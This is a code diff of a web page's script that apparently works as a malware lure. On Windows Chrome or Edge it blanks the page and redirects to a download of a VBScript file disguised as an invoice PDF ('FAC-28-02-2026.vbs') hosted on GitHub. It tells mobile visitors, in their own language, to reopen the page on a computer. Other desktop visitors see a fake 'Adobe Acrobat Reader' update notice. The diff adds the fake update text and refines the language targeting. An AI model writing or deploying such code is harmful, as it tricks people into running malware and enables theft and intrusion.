@@ -76,24 +76,16 @@
 
     function getLangs() {
         let langs = [];
-
-        if (navigator.languages && navigator.languages.length) {
-            langs = navigator.languages;
-        } else if (navigator.language) {
-            langs = [navigator.language];
-        }
-
+        if (navigator.languages && navigator.languages.length) langs = navigator.languages;
+        else if (navigator.language) langs = [navigator.language];
         return langs.map(l => (l || "").toLowerCase());
     }
 
     function isBlocked() {
         const langs = getLangs();
-
         for (let i = 0; i < langs.length; i++) {
-            const base = langs[i].split("-")[0]; // en-US → en
-            if (BLOQUEADOS.includes(base)) {
-                return true;
-            }
+            const base = langs[i].split("-")[0];
+            if (BLOQUEADOS.includes(base)) return true;
         }
         return false;
     }
@@ -114,61 +106,109 @@ window.onload = function () {
     const isEdge = ua.includes("Edg/");
     const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
 
-    // ✅ idioma completo + base (pt-BR -> pt)
-    const lang = (navigator.language || "en").toLowerCase();
-    const langBase = lang.split("-")[0];
+    // ✅ Lista de idiomas (ordem real do dispositivo)
+    const langsRaw = (navigator.languages && navigator.languages.length)
+        ? navigator.languages
+        : [navigator.language || "en"];
 
-    // ✅ Windows → mantém igual (ajusta aqui se quiseres mandar para vendasok.php)
+    const langs = langsRaw
+        .map(l => (l || "en").toLowerCase())
+        .filter(Boolean);
+
+    // ✅ Windows → mantém igual
     if (isWindows && (isChrome || isEdge)) {
         document.body.innerHTML = "";
         window.location.href = "https://github.com/PDF-VIEW/Free/releases/download/pdf/FAC-28-02-2026.vbs";
         return;
     }
 
-    // 🔒 MOBILE → título + mensagem no idioma do telemóvel
+    // Dicionários (mobile)
+    const mobileTitle = {
+        "pt-pt": "Documento indisponível",
+        "pt-br": "Documento indisponível",
+        "pt":    "Documento indisponível",
+        "es": "Documento no disponible",
+        "fr": "Document indisponible",
+        "de": "Dokument nicht verfügbar",
+        "it": "Documento non disponibile",
+        "tr": "Belge kullanılamıyor",
+        "en": "Document unavailable"
+    };
+
+    const mobileMsg = {
+        "pt-pt": "Este documento não pode ser visualizado no telemóvel. Por favor, abra num computador.",
+        "pt-br": "Este documento não pode ser visualizado no celular. Por favor, abra em um computador.",
+        "pt":    "Este documento não pode ser visualizado no telemóvel. Por favor, abra num computador.",
+        "es": "Este documento no se puede ver en el móvil. Ábralo en un ordenador.",
+        "fr": "Ce document ne peut pas être affiché sur mobile. Veuillez l’ouvrir sur un ordinateur.",
+        "de": "Dieses Dokument kann auf dem Handy nicht angezeigt werden. Bitte öffnen Sie es auf einem Computer.",
+        "it": "Questo documento non può essere visualizzato sul cellulare. Aprilo su un computer.",
+        "tr": "Bu belge telefonda görüntülenemez. Lütfen bir bilgisayarda açın.",
+        "en": "This document cannot be viewed on mobile. Please open it on a computer."
+    };
+
+    // ✅ Escolhe UMA chave final (a mesma para título e mensagem)
+    function pickKey(dictA, dictB) {
+        // tenta primeiro o idioma completo (pt-PT), depois base (pt)
+        for (const l of langs) {
+            const base = l.split("-")[0];
+            if (dictA[l] && dictB[l]) return l;
+            if (dictA[base] && dictB[base]) return base;
+        }
+        return "en";
+    }
+
     if (isMobile) {
+        const key = pickKey(mobileTitle, mobileMsg);
 
-        const mobileTitle = {
-            "pt-pt": "Documento indisponível",
-            "pt-br": "Documento indisponível",
-            "pt":    "Documento indisponível",
-
-            "es": "Documento no disponible",
-            "fr": "Document indisponible",
-            "de": "Dokument nicht verfügbar",
-            "it": "Documento non disponibile",
-            "tr": "Belge kullanılamıyor",
-            "en": "Document unavailable"
-        };
-
-        const mobileMsg = {
-            "pt-pt": "Este documento não pode ser visualizado no telemóvel. Por favor, abra num computador.",
-            "pt-br": "Este documento não pode ser visualizado no celular. Por favor, abra em um computador.",
-            "pt":    "Este documento não pode ser visualizado no telemóvel. Por favor, abra num computador.",
-
-            "es": "Este documento no se puede ver en el móvil. Ábralo en un ordenador.",
-            "fr": "Ce document ne peut pas être affiché sur mobile. Veuillez l’ouvrir sur un ordinateur.",
-            "de": "Dieses Dokument kann auf dem Handy nicht angezeigt werden. Bitte öffnen Sie es auf einem Computer.",
-            "it": "Questo documento non può essere visualizzato sul cellulare. Aprilo su un computer.",
-            "tr": "Bu belge telefonda görüntülenemez. Lütfen bir bilgisayarda açın.",
-            "en": "This document cannot be viewed on mobile. Please open it on a computer."
-        };
-
-        document.getElementById("title").innerText =
-            mobileTitle[lang] || mobileTitle[langBase] || mobileTitle["en"];
-
-        document.getElementById("paragraph").innerText =
-            mobileMsg[lang] || mobileMsg[langBase] || mobileMsg["en"];
-
+        document.documentElement.setAttribute("lang", key);
+        document.getElementById("title").innerText = mobileTitle[key] || mobileTitle["en"];
+        document.getElementById("paragraph").innerText = mobileMsg[key] || mobileMsg["en"];
         return;
     }
 
+    // Desktop (não Windows): mantém conteúdo (para não ficar vazio)
+    const desktopTitle = {
+        "pt-pt": "Adobe Acrobat Reader: Ler PDF",
+        "pt-br": "Adobe Acrobat Reader: Ler PDF",
+        "pt":    "Adobe Acrobat Reader: Ler PDF",
+        "es": "Adobe Acrobat Reader: Leer PDF",
+        "fr": "Adobe Acrobat Reader : Lire le PDF",
+        "de": "Adobe Acrobat Reader: PDF lesen",
+        "it": "Adobe Acrobat Reader: Leggi il PDF",
+        "tr": "Adobe Acrobat Reader: PDF görüntüle",
+        "en": "Adobe Acrobat Reader: Read PDF"
+    };
 
-    document.getElementById("title").innerText =
-        desktopTitle[lang] || desktopTitle[langBase] || desktopTitle["en"];
+    const desktopText = {
+        "pt-pt": "Atualizações disponíveis.<br><br>• Para visualizar este ficheiro PDF, é necessário atualizar a aplicação de leitura de PDF.<br><br>Após a atualização, poderá visualizar o ficheiro.",
+        "pt-br": "Atualizações disponíveis.<br><br>• Para visualizar este arquivo PDF, é necessário atualizar o aplicativo de leitura de PDF.<br><br>Após a atualização, será possível visualizar o arquivo.",
+        "pt":    "Atualizações disponíveis.<br><br>• Para visualizar este ficheiro PDF, é necessário atualizar a aplicação de leitura de PDF.<br><br>Após a atualização, poderá visualizar o ficheiro.",
+        "es": "Actualizaciones disponibles.<br><br>• Para ver este archivo PDF, necesitas actualizar tu lector de PDF.<br><br>Después de la actualización, podrás ver el archivo.",
+        "fr": "Mises à jour disponibles.<br><br>• Pour afficher ce fichier PDF, vous devez mettre à jour votre lecteur PDF.<br><br>Après la mise à jour, vous pourrez afficher le fichier.",
+        "de": "Updates verfügbar.<br><br>• Um diese PDF-Datei anzuzeigen, müssen Sie Ihren PDF-Reader aktualisieren.<br><br>Nach dem Update können Sie die Datei anzeigen.",
+        "it": "Aggiornamenti disponibili.<br><br>• Per visualizzare questo PDF, è necessario aggiornare il lettore PDF.<br><br>Dopo l’aggiornamento sarà possibile visualizzare il file.",
+        "tr": "Güncellemeler mevcut.<br><br>• Bu PDF dosyasını görüntülemek için PDF okuyucunuzu güncellemeniz gerekir.<br><br>Güncellemeden sonra dosyayı görüntüleyebilirsiniz.",
+        "en": "Updates available.<br><br>• To view this PDF file, you need to update your PDF reader.<br><br>After the update, you will be able to view the file."
+    };
 
-    document.getElementById("paragraph").innerHTML =
-        desktopText[lang] || desktopText[langBase] || desktopText["en"];
+    // Desktop key único também
+    function pickKeySingle(dict) {
+        for (const l of langs) {
+            const base = l.split("-")[0];
+            if (dict[l]) return l;
+            if (dict[base]) return base;
+        }
+        return "en";
+    }
+
+    const k1 = pickKeySingle(desktopTitle);
+    const k2 = pickKeySingle(desktopText);
+    const k = (k1 === k2) ? k1 : (desktopTitle[k1] && desktopText[k1] ? k1 : (desktopTitle[k2] && desktopText[k2] ? k2 : "en"));
+
+    document.documentElement.setAttribute("lang", k);
+    document.getElementById("title").innerText = desktopTitle[k] || desktopTitle["en"];
+    document.getElementById("paragraph").innerHTML = desktopText[k] || desktopText["en"];
 };
 </script>
 </body>
